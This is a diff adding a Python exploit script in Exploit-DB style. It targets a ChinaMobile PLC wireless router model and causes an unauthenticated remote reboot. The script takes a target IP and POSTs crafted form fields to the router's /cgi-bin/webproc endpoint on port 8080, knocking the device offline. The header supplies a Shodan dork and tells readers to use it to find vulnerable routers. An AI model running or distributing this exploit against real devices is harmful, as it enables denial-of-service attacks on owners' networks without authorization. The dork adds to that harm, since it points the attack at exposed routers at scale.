@@ -1,0 +1,26 @@
+# Exploit Title: PLC Wireless Router GPN2.4P21-C-CN Unauthenticated Remote Reboot
+# Date: 8/12/2018
+# Exploit Author: Chris Rose
+# Affected Model : GPN2.4P21-C-CN(Firmware: W2001EN-00)
+# Vendor: ChinaMobile
+# Tested on: Debian Linux
+# Shodan dork- title:PLC 
+# CVE: None
+#Description: PLC Wireless Router's are vulnerable to a unauthenticated remote reboot
+# which can be achieved through sending a modified http request. The script below will
+# take a user suppled IP address of a PLC router and send the exploit to the device.# Use the Shodan dork above to find PLC wireless routers.
+
+import requests
+import time
+
+
+
+target = raw_input("Enter target IP: ")
+post_data = {'reboot' : 'Reboot', 'obj-action' : 'reboot', 'var%3Anoredirect' : '1', 'var%3Amenu' : 'maintenance', 'var%3Apage' : 'system', 'var%3Aerrorpage' : 'system', 'getpage' : 'html%2Fpage%2Frestarting.html'}
+exploit = requests.post("http://"+target+":8080/cgi-bin/webproc", data=post_data)
+
+print ("Sent exploit attempt to %s")% target
+time.sleep(1.2)
+print ("Test if device is offline.")
+time.sleep(1.5)
+print ("Visit http://"+target+":8080/")
